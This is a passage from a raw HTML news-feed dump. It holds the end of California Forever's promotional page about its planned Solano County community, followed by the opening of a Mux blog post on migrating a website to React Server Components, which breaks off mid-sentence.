          Let’s dust off those plans, <br>
           and breathe new life into them.
        </h2>
        
        <p>
          California Forever was founded in 2017 by our CEO, Jan Sramek. After
          moving to California a decade ago, Jan spent time in Solano County
          during fishing trips on the California Delta and fell in love with the
          area. Having previously lived in many of the world’s most walkable,
          livable, and sustainable towns and cities, Jan became interested in
          fusing what he learned about those livable communities with those old
          plans for eastern Solano. He became committed to a vision for the
          future of Solano County. Jan and his wife Naytri recently purchased
          their first-ever home in Solano, and they are excited to live here
          with their toddler daughter, her soon-to-arrive little brother, and
          golden retriever Bruce.
        </p>
        <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-plans-mobile-01.61dc20a8_Z2kDUJI.webp 1x, https://californiaforever.com/_astro/image-plans-mobile-01@2x.76a4a746_Zcjguj.webp 2x, https://californiaforever.com/_astro/image-plans-mobile-01@2x.76a4a746_Zcjguj.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-plans-01@2x.429a8a1a_1R5hAP.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-plans-01.5f7eca52_1dwArt.webp 1x, https://californiaforever.com/_astro/image-plans-01@2x.429a8a1a_1R5hAP.webp 2x, https://californiaforever.com/_astro/image-plans-01@2x.429a8a1a_1R5hAP.webp 3x" alt="Illustration of a cosy road with children playing on bikes" width="640" height="530" loading="lazy" decoding="async">
</picture>
        <p>
          This idea of building a new community and economic opportunity in
          eastern Solano seemed impossible on the surface, but after spending a
          lot of time learning about Solano and its people, Jan became convinced
          that with a thoughtful design, the right long-term patient investors,
          and strong partnerships with all stakeholders, there would be an
          opportunity to build a remarkable place for Solano residents, both
          current and the many generations to come.
        </p>
        <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-plans-mobile-02.4badca61_Z1WCArY.webp 1x, https://californiaforever.com/_astro/image-plans-mobile-02@2x.6ae45e44_ZBFTrP.webp 2x, https://californiaforever.com/_astro/image-plans-mobile-02@2x.6ae45e44_ZBFTrP.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-plans-02@2x.773017c2_1uRUX2.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-plans-02.ff39793f_Z2hzTdp.webp 1x, https://californiaforever.com/_astro/image-plans-02@2x.773017c2_1uRUX2.webp 2x, https://californiaforever.com/_astro/image-plans-02@2x.773017c2_1uRUX2.webp 3x" alt="Illustration of a lake with people kayaking" width="640" height="530" loading="lazy" decoding="async">
</picture>
        <p>
          To make sure we could do this right, our company raised capital from
          people who shared our long-term vision and belief that California’s
          best days are still ahead. Investors in California Forever include
          Marc Andreessen, Patrick and John Collison, Chris Dixon, John Doerr,
          Nat Friedman, Daniel Gross, Reid Hoffman, Michael Moritz, Laurene
          Powell Jobs, and the California investment firm Andreessen Horowitz.
          Our company is committed to Solano and this project for the long term.
        </p>
        <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-plans-mobile-03.582bfef7_fsRoA.webp 1x, https://californiaforever.com/_astro/image-plans-mobile-03@2x.bf410f81_sVLia.webp 2x, https://californiaforever.com/_astro/image-plans-mobile-03@2x.bf410f81_sVLia.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-plans-03@2x.ac825e81_Z2m84Rd.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-plans-03.45797afa_H4xgN.webp 1x, https://californiaforever.com/_astro/image-plans-03@2x.ac825e81_Z2m84Rd.webp 2x, https://californiaforever.com/_astro/image-plans-03@2x.ac825e81_Z2m84Rd.webp 3x" alt="Illustration of workers assembling solar panels in the field" width="640" height="530" loading="lazy" decoding="async">
</picture>
        <div><p>
          Over the past few years, we have purchased over 50,000 acres in
          eastern Solano County, between Fairfield and Rio Vista. California
          Forever owns about half of the properties in this area. Other
          landowners own the remaining half. Our project would not change the
          zoning of other landowners’ properties – they would remain zoned for
          agriculture, and those landowners would be able to continue their
          agricultural operations. In addition, on our lands, the project would
          include a variety of land uses – a new community, but also solar farms
          and open space, including both agriculture and habitat conservation.
          Our project would protect and support Travis Air Force Base, including
          by respecting Solano County’s official Travis Reserve Area, which is a
          security buffer for the protection of Travis Air Force base
          established by Solano County in its
          <a href="https://www.solanocounty.com/civicax/filebank/blobdload.aspx?BlobID=11013" target="_blank">General Plan</a>, and subsequently clarified through a recent ordinance.
          </p><p>
          
           We have also assembled a team of experts to design this project in
          partnership with all of you. In doing so, we intentionally found
          people who are not only world-class, but also local to the Bay Area,
          with a deep connection to this area and a shared commitment to solving
          Northern California’s most important challenges. Our growing team
          includes
          <a href="https://www.linkedin.com/in/gabriel-metcalf-7462b8b4/" target="_blank">
            Gabriel Metcalf</a>,
          <a href="https://www.nextinfrastructure.com/about-us" target="_blank">
            B.H. Bronson Johnson</a>,
          <a href="https://www.jayprimus.com/about" target="_blank">
            Jay Primus</a>,
          <a href="https://www.akqa.com/" target="_blank">
            AKQA</a>,
          <a href="https://www.sitelaburbanstudio.com/" target="_blank">
            Carlson, Barbee &amp; Gibson</a>,
          <a href="https://www.cmgsite.com/" target="_blank">
            CMG Landscape Architecture</a>,
          <a href="https://www.engeo.com/" target="_blank">
            ENGEO</a>,
          <a href="https://www.ekiconsult.com/" target="_blank">
            EKI Environment &amp; Water</a>,
          <a href="https://www.hklaw.com/en/services/practices/real-estate-hospitality-and-leisure/land-use-and-government" target="_blank">
            Holland &amp; Knight</a>,
          <a href="https://www.fehrandpeers.com/" target="_blank">
            Fehr &amp; Peers</a>,
          <a href="https://www.sitelaburbanstudio.com/" target="_blank">
            Site Lab Urban Studio</a>, and many others.
          </p><p>
          
           With the land and team assembled, we are excited to finally close
          this first chapter and begin the phase of our work that matters most:
          our conversation with you.
        </p></div>
      </section>
      <section>
        <h2>
          Next, a conversation
        </h2>
        <p>
          This is the beginning of our decades-long collaboration with Solano’s
          residents, elected officials and agencies, as well as the many Solano
          stakeholders, including Travis Air Force Base, labor, business,
          agriculture, educators, police, fire, conservation, and many others.
        </p>
        <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-plans-mobile-01.61dc20a8_Z2kDUJI.webp 1x, https://californiaforever.com/_astro/image-plans-mobile-01@2x.76a4a746_Zcjguj.webp 2x, https://californiaforever.com/_astro/image-plans-mobile-01@2x.76a4a746_Zcjguj.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-conversation-01@2x.d3652fed_Z1KWhjR.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-conversation-01.5a11e89b_1xflmx.webp 1x, https://californiaforever.com/_astro/image-conversation-01@2x.d3652fed_Z1KWhjR.webp 2x, https://californiaforever.com/_astro/image-conversation-01@2x.d3652fed_Z1KWhjR.webp 3x" alt="An illustration of a cosy area with lots of restaurants and people" width="640" height="530" loading="lazy" decoding="async">
</picture>
        <p>
          To start, we are meeting with the elected representatives of Solano
          County. Second, so that we hear from each of you directly, we will be
          mailing a survey to every Solano household. Third, we are forming a
          Community Advisory Board of Solano citizens. Please send any
          nominations to <a href="mailto:community@californiaforever.com">
            community@californiaforever.com</a>. Finally, we are working on opening offices in Vallejo, Fairfield
          and Vacaville, and will announce the locations once open. Visit us in
          person.
          </p>
          <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-plans-mobile-02.4badca61_Z1WCArY.webp 1x, https://californiaforever.com/_astro/image-plans-mobile-02@2x.6ae45e44_ZBFTrP.webp 2x, https://californiaforever.com/_astro/image-plans-mobile-02@2x.6ae45e44_ZBFTrP.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-conversation-02@2x.da940703_IpjmS.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-conversation-02.4328d0f2_1cA9CK.webp 1x, https://californiaforever.com/_astro/image-conversation-02@2x.da940703_IpjmS.webp 2x, https://californiaforever.com/_astro/image-conversation-02@2x.da940703_IpjmS.webp 3x" alt="And illustration of a cozy town next to a lake" width="640" height="530" loading="lazy" decoding="async">
</picture>
          <p>
            This is a project that must be not just designed with, but also
            approved by, all Solano residents. Solano County’s Orderly Growth
            Measure directs development into cities, and asks that new projects
            outside of cities be submitted to the voters for approval. We fully
            support these principles, and we will ultimately ask the voters to
            approve the project. The Orderly Growth Measure is the right
            approach to safeguard Solano, including our project, from sprawl and
            disorderly growth for many years to come.
          </p>
          <p>
            California was built on its pioneering spirit, its boundless
            optimism, and the utter conviction that if we work hard, and
            together, that our best days still lie ahead, waiting to be built,
            for our children, and their children, and for all the generations to
            come. California Forever is committed to building a place that
            embodies these ideals. Join us.
          </p>
        

        

        <section>
          <h2>Design principles</h2>
          <p>
            Ultimately, this is about practical ways to improve the day-to-day
            lives of the people who already, or will one day, live in Solano
            County. We are committed to five principles about what to build, and
            what to protect based on our conversations with the people of
            Solano.
          </p>

          <div>
    <div>
      <div>
        <h3>Create good paying local jobs, and paths to get those jobs, for Solano’s residents.</h3>
        <p>This project can bring new employers to Solano, and independently create thousands of permanent, good-paying local jobs in construction, energy, services, and other industries. We are also interested in building trade schools and other educational paths that help Solano residents learn the skills they need to get those new jobs and build long-lasting careers</p>
      </div>
      <div>
            <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-design-05.6b5d5e88_b34y9.webp 1x, https://californiaforever.com/_astro/image-design-05@2x.00903d55_1rN5LK.webp 2x, https://californiaforever.com/_astro/image-design-05@2x.00903d55_1rN5LK.webp 3x" width="362" height="188">
  <img src="https://californiaforever.com/_astro/image-design-05@2x.00903d55_1rN5LK.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-design-05.6b5d5e88_b34y9.webp 1x, https://californiaforever.com/_astro/image-design-05@2x.00903d55_1rN5LK.webp 2x, https://californiaforever.com/_astro/image-design-05@2x.00903d55_1rN5LK.webp 3x" alt="An illustration of construction workers working on the roof of a building" width="528" height="274" loading="lazy" decoding="async">
</picture>
          </div>
    </div>
    <hr>
  </div><div>
    <div>
      <div>
        <h3>Build walkable neighborhoods and new paths to homeownership.</h3>
        <p>Our goal is to build homes of different sizes and price points integrated in the same walkable neighborhoods, with homes, shopping, dining, and schools all within walking distance. We are also interested in exploring new paths to homeownership for Solano residents through down-payment assistance programs and other solutions</p>
      </div>
      <div>
            <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-design-01.6b4e8df9_Z1PexIv.webp 1x, https://californiaforever.com/_astro/image-design-01@2x.81fcea06_Z2rdQdu.webp 2x, https://californiaforever.com/_astro/image-design-01@2x.81fcea06_Z2rdQdu.webp 3x" width="362" height="188">
  <img src="https://californiaforever.com/_astro/image-design-01@2x.81fcea06_Z2rdQdu.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-design-01.6b4e8df9_Z1PexIv.webp 1x, https://californiaforever.com/_astro/image-design-01@2x.81fcea06_Z2rdQdu.webp 2x, https://californiaforever.com/_astro/image-design-01@2x.81fcea06_Z2rdQdu.webp 3x" alt="An illustration of a busy community centre with lots of crowd" width="528" height="274" loading="lazy" decoding="async">
</picture>
          </div>
    </div>
    <hr>
  </div><div>
    <div>
      <div>
        <h3>Help solve regional infrastructure needs, including energy, transportation, water, and wildfire protection.</h3>
        <p>Eastern Solano benefits from existing transmission lines that could make it possible to build a large solar farm that creates hundreds of jobs and accelerates California’s transition to clean energy. Improvements to Highway 12 could make it safer and less congested. The North Bay Aqueduct needs  <a href="https://www.scwa2.com/wp-content/uploads/2020/01/NBA-Funding-Flyer.pdf" target="_blank"> major upgrades</a> to deliver cleaner and more reliable water to over 400,000 people in Solano and Napa counties. Solano’s rural fire districts need more money to keep communities safe from wildfires. We cannot solve any of these issues on our own, but we want to be part of larger regional solutions.</p>
      </div>
      <div>
            <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-design-03.0cce54f4_Z1dOI1F.webp 1x, https://californiaforever.com/_astro/image-design-03@2x.b1cba3da_1yc2Ct.webp 2x, https://californiaforever.com/_astro/image-design-03@2x.b1cba3da_1yc2Ct.webp 3x" width="362" height="188">
  <img src="https://californiaforever.com/_astro/image-design-03@2x.b1cba3da_1yc2Ct.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-design-03.0cce54f4_Z1dOI1F.webp 1x, https://californiaforever.com/_astro/image-design-03@2x.b1cba3da_1yc2Ct.webp 2x, https://californiaforever.com/_astro/image-design-03@2x.b1cba3da_1yc2Ct.webp 3x" alt="An illustration of tram along the road with people" width="528" height="274" loading="lazy" decoding="async">
</picture>
          </div>
    </div>
    <hr>
  </div><div>
    <div>
      <div>
        <h3>Protect and support Travis Air Force Base.</h3>
        <p>Travis Air Force Base is critical to both our national security and to Solano County. We fully support its mission and always will. For example, when California Water Service and Travis were building a new water pipeline to Travis in 2021 and asked us to sell them a right of way for the pipeline, we immediately offered to donate the right of way for free instead. We are just beginning our dialogue with Travis about the right safeguards, but we are committed to respecting its boundaries both on the ground and in the air. We also hope to work with the Air Force in other ways, including by helping provide homes to base personnel, and training and career options for veterans.</p>
      </div>
      <div>
            <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-design-04.ed7b1606_168z4i.webp 1x, https://californiaforever.com/_astro/image-design-04@2x.81552ddb_lReFG.webp 2x, https://californiaforever.com/_astro/image-design-04@2x.81552ddb_lReFG.webp 3x" width="362" height="188">
  <img src="https://californiaforever.com/_astro/image-design-04@2x.81552ddb_lReFG.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-design-04.ed7b1606_168z4i.webp 1x, https://californiaforever.com/_astro/image-design-04@2x.81552ddb_lReFG.webp 2x, https://californiaforever.com/_astro/image-design-04@2x.81552ddb_lReFG.webp 3x" alt="Illustrated Air Force plane in the sky" width="528" height="274" loading="lazy" decoding="async">
</picture>
          </div>
    </div>
    <hr>
  </div><div>
      <div>
        <h3>Protect Solano’s open space and prime agricultural lands.</h3>
        <p>Solano County has a long history of city-centered growth. We believe building a compact community away from prime agricultural lands, surrounded by open space, is the best way to achieve that objective. Many nearby landowners are committed to agriculture, and have told us they do not want to sell or develop their properties. Their properties will, along with some of our properties, form this agricultural green belt around the new community.</p>
      </div>
      <div>
            <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-design-02.70ad598a_ZWbROS.webp 1x, https://californiaforever.com/_astro/image-design-02@2x.3a3a86c9_Z1E9dRi.webp 2x, https://californiaforever.com/_astro/image-design-02@2x.3a3a86c9_Z1E9dRi.webp 3x" width="362" height="188">
  <img src="https://californiaforever.com/_astro/image-design-02@2x.3a3a86c9_Z1E9dRi.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-design-02.70ad598a_ZWbROS.webp 1x, https://californiaforever.com/_astro/image-design-02@2x.3a3a86c9_Z1E9dRi.webp 2x, https://californiaforever.com/_astro/image-design-02@2x.3a3a86c9_Z1E9dRi.webp 3x" alt="An illustration of two bikers on a dirt road" width="528" height="274" loading="lazy" decoding="async">
</picture>
          </div>
    </div>
        </section>

        <section>
          <p>
            <h2>
              Frequently Asked Questions
            </h2>
          </p>
          
        </section>
      </section>
      
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Things I wish I knew before moving 50K lines of code to React Server Components (162 pts)]]></title>
            <link>https://www.mux.com/blog/what-are-react-server-components</link>
            <guid>37345727</guid>
            <pubDate>Fri, 01 Sep 2023 01:29:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.mux.com/blog/what-are-react-server-components">https://www.mux.com/blog/what-are-react-server-components</a>, See on <a href="https://news.ycombinator.com/item?id=37345727">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>React Server Components are a lot. We recently <a href="https://www.mux.com/blog/the-building-blocks-of-great-docs">rethought our docs</a> and <a href="https://www.mux.com/blog/rebranding-during-a-recession">rebranded Mux</a> and, while we were at it, moved all of <a href="https://www.mux.com/">mux.com</a> and <a href="https://docs.mux.com/">docs.mux.com</a> over to Server Components. So… believe me. I know. I also know that it’s possible and not that scary and probably worth it.</p><p>Let me show you why by answering the following questions: <a href="#how-did-we-get-here">Why do Server Components matter</a>, and <a href="#what-are-react-server-components-what-are-they-good-for">what are they good for</a>? <a href="#what-arent-react-server-components-good-for">What are they not good for</a>? <a href="#how-do-i-use-react-server-components">How do you use them</a>, <a href="#how-do-i-incrementally-adopt-react-server-components-in-a-real-life-codebase">how do you incrementally adopt them</a>, and <a href="#did-someone-say-advanced-patterns">what kind of advanced patterns should you use</a> to keep them under control? By the end of all this, you should have a pretty good idea of <a href="#so-should-i-use-react-server-components">whether you should use React Server Components</a> and how to use them effectively.</p><h2 id="how-did-we-get-here"><a href="#how-did-we-get-here"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>How did we get here?</strong></a></h2><p>One great way to understand React Server Components is to understand what problem they’re solving. So let’s start there.</p><p>Long ago, in days of yore, we generated websites on servers using tech like PHP. This was great for fetching data by using secrets and doing CPU-heavy work on big computers so that clients could just get a nice, light HTML page, personalized to them.</p><p>Then, we started wondering: What if we wanted faster responses and more interactivity? Every time a user takes an action, do we <em>really</em> want to send cookies back to the server and make the server generate a whole new page? What if we made the client do that work instead? We can just send all the rendering code to the client as JavaScript!</p><p>This was called client-side rendering (CSR) or single-page applications (SPA) and was <a href="https://begin.com/blog/posts/2023-02-21-why-does-everyone-suddenly-hate-single-page-apps">widely considered a bad move</a>. Sure, it’s simple, which is worth a lot! In fact, for a long time, the React team recommended it as the default approach with their tool, <a href="https://create-react-app.dev/">create-react-app</a>. And for frequently changing, highly interactive pages like a dashboard, it’s probably enough. But what if you want a search engine to read your page, and that search engine doesn’t execute JavaScript? What if you need to keep secrets on a server? What if your users’ devices are low-powered or have poor connections (<a href="https://unctad.org/topic/least-developed-countries/chart-april-2021">as so many do</a>)?</p><p>This is where server-side rendering (SSR) and static site generation (SSG) came in. Tools like <a href="https://nextjs.org/">Next.js</a> and <a href="https://www.gatsbyjs.com/">Gatsby</a> used SSR and SSG to generate the pages on the server and send them to the client as HTML <em>and</em> JavaScript. The best of both worlds. The client can immediately show that HTML so the user has something to look at. Then, once the JS loads, the site becomes nice and interactive. Bonus: search engines can read that HTML, which is cool.</p><p>This is actually quite good! But there are still a few problems to solve. First: most SSR/SSG approaches send <em>all the JavaScript used to generate the page</em> to the client, where the client then <em>runs it all again</em> and marries that HTML with the JavaScript that just booted up. (This marriage, by the way, is called hydration — a term you’ll see a lot in this neck of the woods.) Do we really need to send and run all that JavaScript? Do we really need to duplicate all of the rendering work just to hydrate?</p><p>Second, what if that server-side render takes a long time? Maybe it runs a lot of code, maybe it’s stuck waiting for a slow database call. Then the user’s stuck waiting. Bummer.</p><p>This is where React Server Components come in.</p><h2 id="what-are-react-server-components-what-are-they-good-for"><a href="#what-are-react-server-components-what-are-they-good-for"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>What are React Server Components? What are they good for?</strong></a></h2><p>React Server Components (RSCs) are, unsurprisingly, React components that run on the server instead of on the client. The “what” isn’t nearly as interesting as the “why,” though. Why do we want RSCs? Well, frameworks that support RSCs have two big advantages over SSR.</p><p>First, frameworks that support RSCs give us a way to define where our code runs: what needs to run <em>only</em> on the server (like in the good ol' PHP days) and what should run on the client (like SSR). These are called Server Components and Client Components, respectively. Because we can be explicit about where our code runs, we can send less JavaScript to the client, leading to smaller bundle sizes and less work during hydration.</p><p>The second advantage of RSC-driven frameworks: Server Components can fetch data <em>directly from within the component</em>. When that fetch is complete, Server Components can <em>stream</em> that data to the client.</p><p>This new data-fetching story changes things in two ways. First, fetching data in React is way easier to think about now. Any Server Component can just… fetch data directly using a node library or using the <a href="https://developer.mozilla.org/en-US/docs/Web/API/fetch"><span>fetch</span></a> function we all know and love. Your user component can fetch user data, your movie component can fetch movie data, and so on and so forth. No more using a library or using <a href="https://react.dev/reference/react/useEffect#fetching-data-with-effects"><span>useEffect</span></a> to manage complex loading states (<a href="https://tanstack.com/query/v3/">react-query</a> I still love you), and no more fetching a bunch of data at the page level with <a href="https://nextjs.org/docs/pages/building-your-application/data-fetching/get-server-side-props"><span>getServerSideProps</span></a> and then drilling it down to the component that needs it.</p><p>Second, it solves the problem we talked about earlier. Slow database call? No need to wait; we’ll just send that slow component to the client when it’s ready. Your users can enjoy the rest of the site in the meantime.</p><p>Bonus round: What if you need to fetch data on the server in response to a user’s action on the client (like a form submission)? We have a way to do that, too. The client can send data to the server, and the server can do its fetching or whatever, and stream the response back to the client just like it streamed that initial data. This two-way communication isn't <em>technically</em> React Server Components — this is <a href="https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions#actions">React Actions</a> — but it’s built on the same foundation and is closely related. We’re not going to talk much about React Actions here, though. Gotta save something for <a href="https://www.mux.com/blog/what-are-react-server-actions">the next blog post.</a></p><h2 id="what-arent-react-server-components-good-for"><a href="#what-arent-react-server-components-good-for"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>What <em>aren’t</em> React Server Components good for?</strong></a></h2><p>Up until now, I’ve been painting a pretty rosy picture. If RSCs are so much better than CSR and SSR, why <em>wouldn’t</em> you use them? I was wondering the same thing, and I learned the hard way — as the title of this post suggests — that there is indeed a catch. A few, actually. Here are the three things we spent the most time on when migrating to React Server Components.</p><h3 id="css-in-js-is-a-nonstarter"><a href="#css-in-js-is-a-nonstarter"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>CSS-in-JS is a nonstarter</strong></a></h3><p>Turns out that, as of right now, CSS-in-JS <a href="https://nextjs.org/docs/app/building-your-application/upgrading/app-router-migration#step-7-styling">doesn’t work in Server Components</a>. This one hurt. Moving from <a href="https://styled-components.com/">styled-components</a> to <a href="https://tailwindcss.com/">Tailwind CSS</a> was probably the biggest part of our RSC conversion, although <a href="https://www.mux.com/blog/the-building-blocks-of-great-docs#tailwind-css">we thought it was worth the trouble</a>.</p><p>So, if you went all-in on CSS-in-JS, you’ve got some work to do. At least it’s a great opportunity to migrate to something better, right?</p><h3 id="react-context-doesnt-work-in-server-components"><a href="#react-context-doesnt-work-in-server-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>React Context doesn’t work in Server Components</strong></a></h3><p>You can access <a href="https://react.dev/learn/passing-data-deeply-with-context">React Context</a> <a href="https://nextjs.org/docs/getting-started/react-essentials#rendering-third-party-context-providers-in-server-components"><em>only</em> in Client Components</a>. If you want to share data between Server Components without using props, you’ll probably have to use plain ol' <a href="https://nextjs.org/docs/getting-started/react-essentials#sharing-data-between-server-components">modules</a>.</p><p>And here’s the kicker: If you want some sort of data to be limited to a <em>subtree</em> of your React application, there is no great mechanism for doing that in Server Components. (If I'm wrong, please correct me. I really miss this.)</p><p>On our docs site, this wasn’t too big of a problem. The places where we used React Context heavily were also the places that were highly interactive and needed to be shipped to the client anyway. Our search experience, for example, shares state like <span>queryString</span> and <span>isOpen</span> throughout the component tree.</p><p>On our marketing site, though, this really got us. Our marketing site has areas that share a theme. For example, in the screenshot below, each component in our pre-footer needs to understand that it is on a green background so it knows to use the dark green border. Normally, I would’ve reached for Context to share that theme state, but since these are largely static components that are ideal candidates for Server Components, Context wasn’t an option. We worked around this by leaning hard on <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties</a> (which is probably better, since this is a styling concern, not a data concern). But other developers may not be so lucky.</p><h3 id="honestly-its-hard-to-keep-everything-in-your-head-all-at-once"><a href="#honestly-its-hard-to-keep-everything-in-your-head-all-at-once"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>Honestly, it’s hard to keep everything in your head all at once</strong></a></h3><p>Fundamentally, RSCs give you more flexibility about where your code runs and what your data fetching looks like. <strong>With flexibility comes complexity</strong>. No tool can completely <a href="https://www.joelonsoftware.com/2002/11/11/the-law-of-leaky-abstractions/">paint over this complexity</a>, so at some point, you’re going to have to understand it and confront it and communicate it to other developers.</p><p>Every time a new developer picked up our codebase, the questions came up: “What’s running on the server? What’s running on the client?” Every PR had feedback regarding something accidentally/unnecessarily shipped to the client. I frequently added console logs to my code to see if the server or the client would do the logging. And don’t even get me started on the complexity of <a href="https://nextjs.org/docs/app/building-your-application/data-fetching/caching">caching</a>.</p><p>This has gotten better with practice and with reliable patterns. So let’s talk about that. How do we use React Server Components? How do we suggest migrating incrementally? How do we do tricky things <em>without</em> creating an illegible hairball of spaghetti code?</p><h2 id="how-do-i-use-react-server-components"><a href="#how-do-i-use-react-server-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>How do I use React Server Components?</strong></a></h2><p>You haven’t been scared away yet? Think the pros outweigh the cons? Great! Let’s dive in, starting with the basics.</p><div><p>As of the time of writing, the only production-ready implementation of RSCs is Next.js 13’s new <a href="https://nextjs.org/docs/app">app directory</a>. You <em>could</em> roll your own RSC framework, but if you’re the kind of developer who does that, you’re probably not reading my blog post. Anyway, some notes here might be a bit specific to Next.js.</p></div><h3 id="server-components"><a href="#server-components"><span><span><svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="none" viewBox="0 0 42 42"><path d="m18.172 15.343 3.535-3.535a5 5 0 0 1 7.071 0l1.414 1.414a5 5 0 0 1 0 7.07l-3.535 3.536M23.828 26.657l-3.535 3.535a5 5 0 0 1-7.071 0l-1.414-1.414a5 5 0 0 1 0-7.07l3.535-3.536" vector-effect="non-scaling-stroke"></path><path stroke-linecap="round" d="m25.243 16.757-8.486 8.486" vector-effect="non-scaling-stroke"></path></svg><span>Link42Icon</span></span></span><strong>Server Components</strong></a></h3><p>The mental model of Server Components may be complicated, but the syntax is blissfully simple. By default, any component you write in Next.js 13’s new <a href="https://nextjs.org/docs/app">app directory</a> will be a Server Component. In other words, by 